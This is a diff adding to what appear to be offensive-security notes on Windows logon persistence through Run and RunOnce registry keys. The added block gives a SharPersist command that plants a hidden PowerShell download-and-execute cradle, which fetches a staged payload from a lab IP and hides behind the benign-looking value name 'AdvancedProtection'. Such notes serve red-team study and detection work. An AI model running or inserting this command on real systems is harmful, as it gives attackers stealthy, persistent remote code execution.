@@ -77,3 +77,13 @@ We can also specify which program to run when a user logs in by editing the regi
 - `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
 - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
 - `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
+
+
+```powershell
+# add the registry (-k has different places to add the key `the above hives`)
+sharpersist -- -t reg -c \"powershell.exe\" -a \"-nop -w hidden iex (new-object net.webclient).downloadstring(\'http://192.168.56.1/staged.txt\')\" -k \"hklmrun\" -v \"AdvancedProtection\" -m add
+
+# check it:
+sharpersist -- -t reg -k \"hklmrun\" -m list
+```
+---
